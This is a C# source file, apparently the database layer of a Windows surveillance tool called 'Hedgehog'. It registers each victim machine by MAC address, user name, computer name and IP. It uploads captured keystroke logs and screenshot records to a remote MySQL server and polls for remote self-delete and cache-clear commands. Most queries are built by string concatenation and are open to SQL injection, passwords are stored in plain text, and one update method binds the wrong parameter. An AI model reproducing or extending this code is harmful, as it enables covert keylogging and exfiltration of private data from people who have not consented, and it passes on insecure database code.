using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using MySql.Data.MySqlClient;
using System.Windows.Forms;
using System.Net;
using System.Security.Cryptography;

namespace Hedgehog
{
    class classDatabase
    {
        classBeta beta = new classBeta();
        //MYSQL VARIABLES
        string connStr = "xxxxxxxxxxx";
        public MySqlConnection conn;
        public bool db_connection = false;

        public bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        public void openDatabaseConnection()
        {
            try
            {
                conn = new MySqlConnection(connStr);
                conn.Open();
                db_connection = true;
            }
            catch { beta.writeBeta("CATCH ERRROR: openDatabaseconnection"); }
        }

        public void closeDatabaseConnection()
        {
            try
            {
                conn.Close();
                db_connection = false;
            }
            catch { beta.writeBeta("CATCH ERRROR: closedatabaseConnection"); }
        }

        public string getUserId(string _MACAddress, string _user)
        {
            string id = null;

            try
            {
                MySqlCommand commandCheckUserId = conn.CreateCommand();
                commandCheckUserId.CommandText = "SELECT id FROM tbl_user WHERE mac_address='" + _MACAddress + "' AND user_name='" + _user + "'";

                MySqlDataReader readerCheckUserId = commandCheckUserId.ExecuteReader();
                while (readerCheckUserId.Read())
                {
                    id = readerCheckUserId["id"].ToString();
                }
                readerCheckUserId.Close();
            }
            catch { beta.writeBeta("CATCH ERRROR: getUserId"); }

            return id;
        }

        public string getPassword(string _user_id)
        {
            string pass = null;

            try
            {
                MySqlCommand commandGetPassword = conn.CreateCommand();
                commandGetPassword.CommandText = "SELECT password FROM tbl_user WHERE id='" + _user_id + "'";

                MySqlDataReader readerGetPassword = commandGetPassword.ExecuteReader();
                while (readerGetPassword.Read())
                {
                    pass = readerGetPassword["password"].ToString();
                }
                readerGetPassword.Close();
            }
            catch { beta.writeBeta("CATCH ERRROR: getPassword"); }

            return pass;
        }

        public void getAllRequests(string _user_id, out bool _cacheClear, out int _selfDelete, out int _cicle_time)
        {
            _cacheClear = false;
            _selfDelete = '0';
            _cicle_time = 301;

            try
            {
                MySqlCommand commandRequests = conn.CreateCommand();
                commandRequests.CommandText = "SELECT request_cacheclear, request_selfdelete, cicle_time FROM tbl_user WHERE id='" + _user_id + "'";

                MySqlDataReader readerRequests = commandRequests.ExecuteReader();

                while (readerRequests.Read())
                {
                    if (readerRequests["request_cacheclear"].ToString().ToLower() == "true")
                        _cacheClear = true;

                    _selfDelete = Convert.ToInt16(readerRequests["request_selfdelete"]);

                    _cicle_time = Convert.ToInt16(readerRequests["cicle_time"]);
                }
                readerRequests.Close();
                commandRequests.Dispose();
            }
            catch { beta.writeBeta("CATCH ERRROR: getAllRequests"); }
        }

        public bool checkEmailRegisted(string _email)
        {
            int count = 0;
            bool emailRegisted = false;

            try
            {
                MySqlCommand commandCheckEmail = conn.CreateCommand();
                commandCheckEmail.CommandText = "SELECT id FROM tbl_user WHERE email='" + _email + "'";

                MySqlDataReader readerCheckEmail = commandCheckEmail.ExecuteReader();
                while (readerCheckEmail.Read())
                {
                    count++;
                }
                if (count == 0)
                {
                    emailRegisted = false;
                }
                else
                {
                    emailRegisted = true;
                }
                readerCheckEmail.Close();
            }
            catch { beta.writeBeta("CATCH ERRROR: checkEmailRegisted"); }
            return emailRegisted;
        }

        public int getRequestSelfDelete(string _user_id) //0 - Normal, 1 - User request to self delete, 2 - seld delete accomplish
        {
            int self = -1;

            try
            {
                MySqlCommand commandCheckRequestSelfDelete = conn.CreateCommand();
                commandCheckRequestSelfDelete.CommandText = "SELECT request_selfdelete FROM tbl_user WHERE id='" + _user_id + "'";

                MySqlDataReader readerRequestSelfDelete = commandCheckRequestSelfDelete.ExecuteReader();
                while (readerRequestSelfDelete.Read())
                {
                    self = Convert.ToInt16(readerRequestSelfDelete["request_selfdelete"]);
                }
                readerRequestSelfDelete.Close();
            }
            catch { beta.writeBeta("CATCH ERRROR: checkRequestSelfDelete"); }

            return self;
        }

        public void insertNewUser(string _user_id, string _MAC_address, string _windows_user, string _computerName, string _email, string _password, string _ip)
        {
            try
            {
                MySqlCommand commandInsert = conn.CreateCommand();
                commandInsert.CommandText = "INSERT INTO tbl_user ("+
                    " user_id,"+                         //1
                    " mac_address,"+                     //2
                    " email," +                          //3
                    " password," +                       //4
                    " computer_name," +                  //5
                    " user_name," +                      //6
                    " account_date," +                   //7
                    " installation_date," +              //8
                    " last_connection_date," +           //9      
                    " last_connection_ip," +             //10
                    " last_cacheclear_date," +           //11
                    " request_cacheclear," +             //12
                    " request_selfdelete," +             //13
                    " cicle_time,"+                      //14
                    " online"+                           //15
                ") values(@1, @2, @3, @4, @5, @6, @7, @8, @9, @10, @11, @12, @13, @14, @15)";
                commandInsert.Parameters.AddWithValue("@1", _user_id);
                commandInsert.Parameters.AddWithValue("@2", _MAC_address);
                commandInsert.Parameters.AddWithValue("@3", _email);
                commandInsert.Parameters.AddWithValue("@4", _password);
                commandInsert.Parameters.AddWithValue("@5", _computerName);
                commandInsert.Parameters.AddWithValue("@6", _windows_user);
                commandInsert.Parameters.AddWithValue("@7", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                commandInsert.Parameters.AddWithValue("@8", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                commandInsert.Parameters.AddWithValue("@9", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                commandInsert.Parameters.AddWithValue("@10", _ip);
                commandInsert.Parameters.AddWithValue("@11", null);
                commandInsert.Parameters.AddWithValue("@12", false);
                commandInsert.Parameters.AddWithValue("@13", '0');
                commandInsert.Parameters.AddWithValue("@14", "300");
                commandInsert.Parameters.AddWithValue("@15", false);
                commandInsert.ExecuteNonQuery();
                commandInsert.Dispose();
            }
            catch
            {
                hedgehogExitwithMessage("Database new user insert error! Please try later.");
            }
        }

        public void updateLastConnection(string _user_id, string _ip)
        {
            try
            {
                MySqlCommand commandUpdate = conn.CreateCommand();
                commandUpdate.CommandText = "UPDATE tbl_user SET last_connection_date=@1, last_connection_ip=@2, online=@3 WHERE id='" + _user_id + "'";
                commandUpdate.Parameters.AddWithValue("@1", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                commandUpdate.Parameters.AddWithValue("@2", _ip);
                commandUpdate.Parameters.AddWithValue("@3", true);
                commandUpdate.ExecuteNonQuery();
                commandUpdate.Dispose();
            }
            catch { beta.writeBeta("CATCH ERRROR: updateLastConnection"); }
        }

        public void updateOnlineStatus(string _user_id, bool _state)
        {
            try
            {
                MySqlCommand commandUpdate = conn.CreateCommand();
                commandUpdate.CommandText = "UPDATE tbl_user SET online=@1 WHERE id='" + _user_id + "'";
                commandUpdate.Parameters.AddWithValue("@1", _state);
                commandUpdate.ExecuteNonQuery();
                commandUpdate.Dispose();
            }
            catch { beta.writeBeta("CATCH ERRROR: updateOnlineStatus"); }
        }

        public void updateUserInstallation(string _user_id, string _email)
        {
            try
            {
                MySqlCommand commandUpdate = conn.CreateCommand();
                commandUpdate.CommandText = "UPDATE tbl_user SET email=@1, installation_date=@2, request_selfdelete=@3  WHERE id='" + _user_id + "'";
                commandUpdate.Parameters.AddWithValue("@2", _email);
                commandUpdate.Parameters.AddWithValue("@2", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                commandUpdate.Parameters.AddWithValue("@3", "0");
                commandUpdate.ExecuteNonQuery();
                commandUpdate.Dispose();
            }
            catch { beta.writeBeta("CATCH ERRROR: updateUserInstalation"); }
        }

        public void updatePassword(string _user_id,string _password)
        {
            try
            {
                MySqlCommand commandUpdate = conn.CreateCommand();
                commandUpdate.CommandText = "UPDATE tbl_user SET password=@1 WHERE id='" + _user_id + "'";
                commandUpdate.Parameters.AddWithValue("@1", _password);
                commandUpdate.ExecuteNonQuery();
                commandUpdate.Dispose();
            }
            catch
            {
                hedgehogExitwithMessage("Database password update error! Please try later.");
            }
        }

        public void updateRequestSelfDelete(string _user_id, char _deleteStatus)
        {
            try
            {
                MySqlCommand commandUpdate = conn.CreateCommand();
                commandUpdate.CommandText = "UPDATE tbl_user SET request_selfdelete=@1 WHERE id='" + _user_id + "'";
                commandUpdate.Parameters.AddWithValue("@1", _deleteStatus);
                commandUpdate.ExecuteNonQuery();
                commandUpdate.Dispose();
            }
            catch { beta.writeBeta("CATCH ERRROR: updateRequestSelfDelete"); }
        }

        public void updateRequestCacheClear(string _user_id, bool _cacheClearStatus)
        {
            try
            {
                MySqlCommand commandUpdate = conn.CreateCommand();
                commandUpdate.CommandText = "UPDATE tbl_user SET request_cacheclear=@1 WHERE id='" + _user_id + "'";
                commandUpdate.Parameters.AddWithValue("@1", _cacheClearStatus);
                commandUpdate.ExecuteNonQuery();
                commandUpdate.Dispose();
            }
            catch { beta.writeBeta("CATCH ERRROR: updateRequestCacheClear"); }
        }

        //TBL_KEYLOGS

        public bool checkKeylog(string _user_id)
        {
            int count = 0;
            bool userKeylog = false;

            try
            {
                MySqlCommand commandCheckKeylog = conn.CreateCommand();
                commandCheckKeylog.CommandText = "SELECT id FROM tbl_keylogs WHERE user_id='" + _user_id + "'";

                MySqlDataReader readerCheckKeylog = commandCheckKeylog.ExecuteReader();
                while (readerCheckKeylog.Read())
                {
                    count++;
                }
                if (count == 0)
                {
                    userKeylog = false;
                }
                else
                {
                    userKeylog = true;
                }
                readerCheckKeylog.Close();
                commandCheckKeylog.Dispose();
            }
            catch{ beta.writeBeta("CATCH ERRROR: checkKeylog");}
            return userKeylog;
        }

        public void createKeylog(string _user_id)
        {
            try
            {
                MySqlCommand commandInsert = conn.CreateCommand();
                commandInsert.CommandText = "INSERT INTO tbl_keylogs (" +
                    " user_id," +                        //1
                    " last_upload_date," +               //2
                    " log" +                             //3
                ") values(@1, @2, @3)";
                commandInsert.Parameters.AddWithValue("@1", _user_id);
                commandInsert.Parameters.AddWithValue("@2", null);
                commandInsert.Parameters.AddWithValue("@3", " "); //Não posso inserir null pois vai entrar em conflito com o concat do updateKeylog
                commandInsert.ExecuteNonQuery();
                commandInsert.Dispose();
            }
            catch
            {
                hedgehogExitwithMessage("Database keylog table error! Please try later.");
            }
        }

        public bool updateKeylog(string _user_id, string _log)
        {
            try
            {
                MySqlCommand commandUpdate = conn.CreateCommand();
                commandUpdate.CommandText = "UPDATE tbl_keylogs SET last_upload_date='" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "', log=CONCAT(log,'" + _log + "') WHERE user_id='" + _user_id + "'";
                commandUpdate.ExecuteNonQuery();
                commandUpdate.Dispose();
                return true;
            }
            catch
            {
                beta.writeBeta("CATCH ERRROR: updateKeylog");
                return false;
            }
        }


        //TBL_PRINTSCREENS

        public bool createPrintScreen(string _user_id, string _fileName)
        {
            try
            {
                MySqlCommand commandInsert = conn.CreateCommand();
                commandInsert.CommandText = "INSERT INTO tbl_printscreens (" +
                    " user_id," +                        //1
                    " date," +                           //2
                    " file_name," +                      //3
                    " request_delete" +                  //4
                ") values(@1, @2, @3, @4)";
                commandInsert.Parameters.AddWithValue("@1", _user_id);
                commandInsert.Parameters.AddWithValue("@2", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                commandInsert.Parameters.AddWithValue("@3", _fileName);
                commandInsert.Parameters.AddWithValue("@4", "0");
                commandInsert.ExecuteNonQuery();
                commandInsert.Dispose();
                return true;
            }
            catch
            {
                //FUTURO: verificar codigo do erro e se for erro de duplicação expecificar no Beta file
                beta.writeBeta("CATCH ERRROR: createPrintScreen");
                return false;
            }
        }

        public bool checkPrintscreenRegisted(string _fileName)
        {
            int count = 0;
            bool printscreenRegisted = false;

            try
            {
                MySqlCommand commandPrintscreenRegisted = conn.CreateCommand();
                commandPrintscreenRegisted.CommandText = "SELECT id FROM tbl_printscreens WHERE file_name='" + _fileName + "'";

                MySqlDataReader readerPrintscreenRegisted = commandPrintscreenRegisted.ExecuteReader();
                while (readerPrintscreenRegisted.Read())
                {
                    count++;
                }
                if (count == 0)
                {
                    printscreenRegisted = false;
                }
                else
                {
                    printscreenRegisted = true;
                }
                readerPrintscreenRegisted.Close();
                commandPrintscreenRegisted.Dispose();
            }
            catch { beta.writeBeta("CATCH ERRROR: checkPrintscreenRegisted"); }
            return printscreenRegisted;
        }

        // HEDGEHOG EXIT

        public void hedgehogExit()
        {
            if (db_connection == true)
                if (conn.State == System.Data.ConnectionState.Open)
                    closeDatabaseConnection();

            Environment.Exit(0);
        }

        public void hedgehogExitwithMessage(string _error)
        {
            if (db_connection == true)
                if (conn.State == System.Data.ConnectionState.Open)
                    closeDatabaseConnection();

            MessageBox.Show(_error,
                "Hedgehog Error",
                MessageBoxButtons.OK,
                MessageBoxIcon.Warning);

            Environment.Exit(0);
        }

    }
}
